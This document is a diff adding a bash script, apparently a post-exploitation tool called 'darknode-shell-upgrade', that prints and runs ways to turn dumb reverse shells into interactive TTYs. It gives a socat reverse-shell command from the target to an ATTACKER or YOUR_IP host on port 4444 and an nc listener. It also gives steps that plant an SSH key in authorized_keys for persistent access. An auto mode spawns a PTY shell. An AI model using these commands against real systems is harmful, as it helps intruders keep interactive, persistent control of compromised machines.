@@ -1,0 +1,86 @@
+#!/usr/bin/env bash
+# darknode-shell-upgrade — upgrade dumb reverse shells to fully interactive TTYs
+set -uo pipefail
+c(){ printf '\e[1;36m%s\e[0m\n' "$*"; }
+g(){ printf '\e[32m%s\e[0m\n' "$*"; }
+y(){ printf '\e[33m%s\e[0m\n' "$*"; }
+r(){ printf '\e[31m%s\e[0m\n' "$*"; }
+dim(){ printf '\e[2m%s\e[0m\n' "$*"; }
+
+cmd_tips(){
+  c "Shell Upgrade Techniques"
+  echo ""
+  echo "  1. Python PTY (most common):"
+  echo '     python3 -c '"'"'import pty; pty.spawn("/bin/bash")'"'"
+  echo "     Then: Ctrl+Z, stty raw -echo; fg, export TERM=xterm"
+  echo ""
+  echo "  2. Script method:"
+  echo "     script /dev/null -qc /bin/bash"
+  echo ""
+  echo "  3. Socat (best, needs socat on target):"
+  echo "     Listener: socat file:\$(tty),raw,echo=0 tcp-listen:4444"
+  echo "     Target:   socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:4444"
+  echo ""
+  echo "  4. rlwrap (attacker side):"
+  echo "     rlwrap nc -nlvp 4444"
+  echo ""
+  echo "  5. Expect:"
+  echo "     python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
+  echo ""
+  echo "  6. stty fix (after Python PTY):"
+  echo "     stty rows \$(tput lines) cols \$(tput cols)"
+  echo ""
+  echo "  7. SSH escape (if you can write authorized_keys):"
+  echo "     ssh-keygen -t ed25519 -f /tmp/key -N ''"
+  echo "     echo \$(cat /tmp/key.pub) >> ~/.ssh/authorized_keys"
+  echo "     ssh -i /tmp/key user@target"
+}
+
+cmd_auto(){
+  c "Auto Shell Upgrade"
+  echo ""
+  echo "  Detecting current shell type..."
+  if [ -t 0 ]; then
+    g "  Already in an interactive terminal."
+    echo "  TTY: $(tty)"
+    echo "  TERM: ${TERM:-not set}"
+    echo "  Rows: $(tput lines 2>/dev/null || echo ?), Cols: $(tput cols 2>/dev/null || echo ?)"
+  else
+    y "  Non-interactive shell detected."
+    echo "  Attempting upgrade..."
+    if command -v python3 >/dev/null 2>&1; then
+      echo "  Using Python3 PTY..."
+      python3 -c 'import pty; pty.spawn("/bin/bash")'
+    elif command -v python >/dev/null 2>&1; then
+      echo "  Using Python PTY..."
+      python -c 'import pty; pty.spawn("/bin/bash")'
+    elif command -v script >/dev/null 2>&1; then
+      echo "  Using script method..."
+      script /dev/null -qc /bin/bash
+    else
+      r "  No upgrade method available. Try manually."
+      cmd_tips
+    fi
+  fi
+}
+
+cmd_pty(){ echo "  Run this on the target:"; echo '  python3 -c '"'"'import pty; pty.spawn("/bin/bash")'"'"''; echo "  Then: Ctrl+Z"; echo "  stty raw -echo; fg"; echo "  export TERM=xterm"; echo "  stty rows \$(tput lines) cols \$(tput cols)"; }
+cmd_socat(){ echo "  Listener (your machine):"; echo "  socat file:\$(tty),raw,echo=0 tcp-listen:4444"; echo "  Target:"; echo "  socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:YOUR_IP:4444"; }
+cmd_script(){ echo "  Run on target:"; echo "  script /dev/null -qc /bin/bash"; }
+
+usage(){ cat << 'U'
+  darknode-shell-upgrade — upgrade dumb shells to interactive TTYs
+
+  Commands:
+    auto      Auto-detect and upgrade current shell
+    pty       Show Python PTY upgrade steps
+    socat     Show socat upgrade steps
+    script    Show script method steps
+    tips      Show all upgrade techniques
+U
+}
+cmd="${1:-tips}"; shift 2>/dev/null || true
+case "$cmd" in
+  auto) cmd_auto ;; pty) cmd_pty ;; socat) cmd_socat ;; script) cmd_script ;;
+  tips) cmd_tips ;; help|--help|-h) usage ;; *) r "Unknown: $cmd"; usage; exit 1 ;;
+esac
